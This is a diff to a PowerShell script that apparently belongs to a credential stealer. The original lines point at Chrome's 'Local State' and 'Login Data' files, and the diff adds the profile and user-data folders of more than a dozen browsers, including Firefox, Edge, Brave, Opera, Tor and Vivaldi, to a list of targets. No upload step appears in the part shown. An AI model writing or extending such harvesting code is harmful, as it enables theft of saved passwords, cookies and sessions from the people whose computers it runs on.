@@ -2,7 +2,24 @@
 # Specify the path to the Local State file
 $paths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Login Data"
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Login Data",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\",
+    "$env:LOCALAPPDATA\Mozilla\Firefox\\Profiles\",
+    "$env:APPDATA\Opera Software\Opera Stable\",
+    "$env:APPDATA\Opera Software\Opera GX\",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\",
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\",
+    "$env:LOCALAPPDATA\Vivaldi\User Data\",
+    "$env:LOCALAPPDATA\Apple Computer\Safari\",
+    "$env:LOCALAPPDATA\Tor Browser\Browser\TorBrowser\Data\Browser\profile",
+    "$env:LOCALAPPDATA\Maxthon3\Users\",
+    "$env:LOCALAPPDATA\Epic Privacy Browser\User Data\",
+    "$env:LOCALAPPDATA\AVAST Software\Browser\User Data\",
+    "$env:LOCALAPPDATA\Chromium\User Data\",
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\",
+    "$env:LOCALAPPDATA\CentBrowser\User Data\",
+    "$env:LOCALAPPDATA\Chromium\User Data\"
+
 )
 function Get-CurrentUser {
     $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
